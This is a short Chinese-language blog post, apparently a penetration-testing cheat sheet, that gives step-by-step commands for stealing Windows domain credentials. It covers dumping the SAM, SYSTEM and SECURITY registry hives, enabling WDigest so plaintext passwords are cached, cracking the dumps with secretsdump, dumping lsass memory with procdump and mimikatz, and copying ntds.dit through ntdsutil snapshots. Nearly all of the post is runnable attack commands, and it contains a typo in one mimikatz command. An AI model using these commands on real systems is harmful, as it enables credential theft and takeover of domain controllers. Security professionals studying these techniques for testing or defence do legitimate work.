# 离线提取域控HASH的方法




## 1.注册表提取

提取文件，Windows Server 2003或者Win XP 及以前需要提升到system权限，以后只要Administrator权限即可。

```verilog
reg save hklm\sam sam.hive
reg save hklm\system system.hive
reg save hklm\security secruity.hive
```





本地获取：

```dockerfile
# 如果要提取明文，请修改注册表
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1

# 破解hash
python ./secretsdump.py -sam ~/Desktop/sam.hive  -security ~/Desktop/security.hive -system ~/Desktop/system.hive  LOCAL
```



## 2.lsass.exe提取

```bash
procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz#privilege::debug
mimikatz#sekurlsa::minidump lsass.dmp
mimikatz#sekrulsa::logonpasswords full  

```









## 3.ntds.dit提取

```bash
ntdsutil snapshot "activate instance ntds" create quit quit
ntdsutil snapshot "mount {GUID}" quit quit
copy MOUNT_POINT\windows\ntds\ntds.dit c:\temp\ntds.dit
ntdsutil snapshot "unmount {GUID}" "delete {GUID}" quit quit

```















---

> 作者: [剑胆琴心](http://geoer.cn)  
> URL: https://geoer.cn/%E7%A6%BB%E7%BA%BF%E6%8F%90%E5%8F%96%E5%9F%9F%E6%8E%A7hash%E7%9A%84%E6%96%B9%E6%B3%95/  

